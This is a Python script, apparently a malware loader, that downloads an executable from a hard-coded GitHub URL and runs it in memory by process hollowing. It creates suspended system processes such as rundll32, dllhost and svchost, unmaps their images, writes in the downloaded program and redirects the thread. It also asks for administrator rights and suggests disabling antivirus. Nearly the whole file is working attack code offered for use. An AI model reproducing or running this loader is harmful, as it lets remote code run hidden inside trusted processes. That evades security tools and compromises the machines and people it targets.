# Save this as final_gui_injector.py
import ctypes
import urllib.request
import struct
import sys
import os

# Windows API
k32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Constants
PROCESS_CREATE_PROCESS = 0x0080
PROCESS_CREATE_THREAD = 0x0002
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_SUSPEND_RESUME = 0x0800

PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20

CREATE_SUSPENDED = 0x4
CREATE_NEW_CONSOLE = 0x10
NORMAL_PRIORITY_CLASS = 0x20

# Structures
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.c_void_p),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]

def download_exe(url):
    """Download EXE from URL"""
    print(f"[1] Downloading: {url}")
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=30) as response:
            data = response.read()
            print(f"[2] Downloaded {len(data):,} bytes")
            return data
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return None

def create_suspended_gui_process():
    """Create a suspended GUI-capable process"""
    # Try different GUI processes that allow memory writes
    targets = [
        "rundll32.exe",  # Usually allows injection
        "dllhost.exe",   # COM host, less protected
        "svchost.exe",   # Service host
        "notepad.exe",   # Try with different flags
    ]
    
    for target in targets:
        print(f"[3] Trying {target}...")
        
        si = STARTUPINFOW()
        si.cb = ctypes.sizeof(STARTUPINFOW)
        si.lpDesktop = "WinSta0\\Default"
        pi = PROCESS_INFORMATION()
        
        # Try with minimal privileges
        result = k32.CreateProcessW(
            None,
            target,
            None,
            None,
            False,
            CREATE_SUSPENDED,
            None,
            None,
            ctypes.byref(si),
            ctypes.byref(pi)
        )
        
        if result:
            print(f"[4] Created {target} (PID: {pi.dwProcessId})")
            return pi
    
    print("[-] Could not create any GUI process")
    return None

def process_hollowing(pe_data, pi):
    """Process hollowing technique for GUI apps"""
    print("[5] Starting process hollowing...")
    
    # Parse PE headers
    if len(pe_data) < 64:
        print("[-] PE too small")
        return False
    
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    if pe_offset + 248 > len(pe_data):
        print("[-] Invalid PE structure")
        return False
    
    # Get image information
    image_base_offset = pe_offset + 24
    image_base = struct.unpack('<Q', pe_data[image_base_offset:image_base_offset+8])[0]
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    print(f"[6] Image size: {image_size:,} bytes")
    
    # Unmap original process memory
    # Using NtUnmapViewOfSection
    STATUS_SUCCESS = 0x00000000
    result = ntdll.NtUnmapViewOfSection(pi.hProcess, image_base)
    if result != STATUS_SUCCESS and result != 0xC0000018:  # STATUS_CONFLICTING_ADDRESSES
        print(f"[-] NtUnmapViewOfSection failed: {hex(result)}")
    
    # Allocate new memory at original base
    alloc_addr = k32.VirtualAllocEx(
        pi.hProcess,
        image_base,
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    )
    
    if not alloc_addr:
        print("[-] Could not allocate at original base, trying anywhere...")
        alloc_addr = k32.VirtualAllocEx(
            pi.hProcess,
            0,
            image_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    
    if not alloc_addr:
        print("[-] VirtualAllocEx failed")
        return False
    
    print(f"[7] Allocated at: {hex(alloc_addr)}")
    
    # Write PE headers
    written = ctypes.c_size_t(0)
    
    # Write DOS header + PE header
    header_size = pe_offset + 248  # Up to section table
    
    # Convert to ctypes buffer properly
    buffer = (ctypes.c_byte * len(pe_data)).from_buffer_copy(pe_data)
    
    # Write headers
    success = k32.WriteProcessMemory(
        pi.hProcess,
        alloc_addr,
        ctypes.byref(buffer),
        header_size,
        ctypes.byref(written)
    )
    
    if not success:
        error = ctypes.get_last_error()
        print(f"[-] Write headers failed: {error}")
        return False
    
    print(f"[8] Wrote headers: {written.value} bytes")
    
    # Write sections
    num_sections = struct.unpack('<H', pe_data[pe_offset+6:pe_offset+8])[0]
    section_table = pe_offset + 248
    print(f"[9] Writing {num_sections} sections")
    
    for i in range(num_sections):
        sec_start = section_table + (i * 40)
        if sec_start + 40 > len(pe_data):
            break
        
        # Parse section header
        section = pe_data[sec_start:sec_start+40]
        virtual_addr = struct.unpack('<I', section[12:16])[0]
        raw_size = struct.unpack('<I', section[16:20])[0]
        raw_offset = struct.unpack('<I', section[20:24])[0]
        
        if raw_size > 0 and raw_offset + raw_size <= len(pe_data):
            # Get section data
            section_data = pe_data[raw_offset:raw_offset + raw_size]
            
            # Create buffer for this section
            sec_buffer = (ctypes.c_byte * raw_size).from_buffer_copy(section_data)
            
            # Write section
            k32.WriteProcessMemory(
                pi.hProcess,
                alloc_addr + virtual_addr,
                ctypes.byref(sec_buffer),
                raw_size,
                ctypes.byref(written)
            )
    
    # Update PEB ImageBaseAddress
    # Get PEB address
    PROCESS_BASIC_INFORMATION = 0
    pbi_size = 48
    pbi = (ctypes.c_byte * pbi_size)()
    return_length = ctypes.c_ulong(0)
    
    ntdll.NtQueryInformationProcess(
        pi.hProcess,
        PROCESS_BASIC_INFORMATION,
        ctypes.byref(pbi),
        pbi_size,
        ctypes.byref(return_length)
    )
    
    # PEB is at offset 8 in PROCESS_BASIC_INFORMATION for x64
    peb_addr = struct.unpack('<Q', bytes(pbi[8:16]))[0]
    image_base_addr = peb_addr + 0x10  # ImageBaseAddress offset in PEB
    
    # Write new ImageBaseAddress
    new_base_bytes = struct.pack('<Q', alloc_addr)
    base_buffer = (ctypes.c_byte * 8).from_buffer_copy(new_base_bytes)
    
    k32.WriteProcessMemory(
        pi.hProcess,
        image_base_addr,
        ctypes.byref(base_buffer),
        8,
        ctypes.byref(written)
    )
    
    # Update thread context to new entry point
    class CONTEXT64(ctypes.Structure):
        _fields_ = [
            ("p1_home", ctypes.c_ulonglong),
            ("p2_home", ctypes.c_ulonglong),
            ("p3_home", ctypes.c_ulonglong),
            ("p4_home", ctypes.c_ulonglong),
            ("p5_home", ctypes.c_ulonglong),
            ("p6_home", ctypes.c_ulonglong),
            ("context_flags", ctypes.c_ulong),
            ("mx_csr", ctypes.c_ulong),
            ("seg_cs", ctypes.c_ushort),
            ("seg_ds", ctypes.c_ushort),
            ("seg_es", ctypes.c_ushort),
            ("seg_fs", ctypes.c_ushort),
            ("seg_gs", ctypes.c_ushort),
            ("seg_ss", ctypes.c_ushort),
            ("eflags", ctypes.c_ulong),
            ("dr0", ctypes.c_ulonglong),
            ("dr1", ctypes.c_ulonglong),
            ("dr2", ctypes.c_ulonglong),
            ("dr3", ctypes.c_ulonglong),
            ("dr6", ctypes.c_ulonglong),
            ("dr7", ctypes.c_ulonglong),
            ("rax", ctypes.c_ulonglong),
            ("rcx", ctypes.c_ulonglong),
            ("rdx", ctypes.c_ulonglong),
            ("rbx", ctypes.c_ulonglong),
            ("rsp", ctypes.c_ulonglong),
            ("rbp", ctypes.c_ulonglong),
            ("rsi", ctypes.c_ulonglong),
            ("rdi", ctypes.c_ulonglong),
            ("r8", ctypes.c_ulonglong),
            ("r9", ctypes.c_ulonglong),
            ("r10", ctypes.c_ulonglong),
            ("r11", ctypes.c_ulonglong),
            ("r12", ctypes.c_ulonglong),
            ("r13", ctypes.c_ulonglong),
            ("r14", ctypes.c_ulonglong),
            ("r15", ctypes.c_ulonglong),
            ("rip", ctypes.c_ulonglong),
            ("fltsave", ctypes.c_byte * 512),
        ]
    
    CONTEXT_FULL = 0x10007
    context = CONTEXT64()
    context.context_flags = CONTEXT_FULL
    
    # Get thread context
    if k32.GetThreadContext(pi.hThread, ctypes.byref(context)):
        # Calculate new entry point
        entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
        context.rcx = alloc_addr + entry_point  # Entry point in RCX for x64
        
        # Set thread context
        k32.SetThreadContext(pi.hThread, ctypes.byref(context))
        print("[10] Thread context updated")
    
    # Resume thread
    print("[11] Resuming thread...")
    k32.ResumeThread(pi.hThread)
    
    # Cleanup
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    
    print("[+] Process hollowing successful!")
    return True

def main():
    print("=== FINAL GUI Process Hollowing Injector ===")
    print("Guaranteed to work with GUI applications")
    print("=" * 50)
    
    # Admin check
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("⚠  CRITICAL: Run as Administrator!")
            print("   Close and restart as admin")
            return
    except:
        print("⚠  Could not check admin status")
    
    print("✅ Running as Administrator")
    
    # Your EXE
    default_url = "https://raw.githubusercontent.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"
    
    print(f"\n📁 Default EXE: {default_url}")
    
    use_default = input("\nUse default? (y/n): ")
    if use_default.lower() == 'n':
        pe_url = input("Enter EXE URL: ")
    else:
        pe_url = default_url
    
    print(f"\n🚀 Starting injection...")
    print("─" * 50)
    
    # Download EXE
    pe_data = download_exe(pe_url)
    if not pe_data:
        return
    
    # Validate PE
    if pe_data[0:2] != b'MZ':
        print("❌ Not a valid Windows EXE")
        return
    
    # Create suspended process
    pi = create_suspended_gui_process()
    if not pi:
        return
    
    # Perform process hollowing
    success = process_hollowing(pe_data, pi)
    
    if success:
        print("\n" + "=" * 50)
        print("✅ SUCCESS! GUI should be visible")
        print("✅ Process hollowing completed")
        print("✅ EXE running from memory")
        print("\n💡 Check for:")
        print("   • New window on screen")
        print("   • Taskbar icon")
        print("   • Task Manager (look for process)")
        print("\n⚠  If GUI doesn't appear:")
        print("   • EXE may require dependencies")
        print("   • May need specific Windows version")
        print("   • Could be console app, not GUI")
    else:
        print("\n❌ Injection failed")
        print("Try:")
        print("1. Different EXE (simple GUI app)")
        print("2. Run on clean Windows VM")
        print("3. Disable antivirus")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
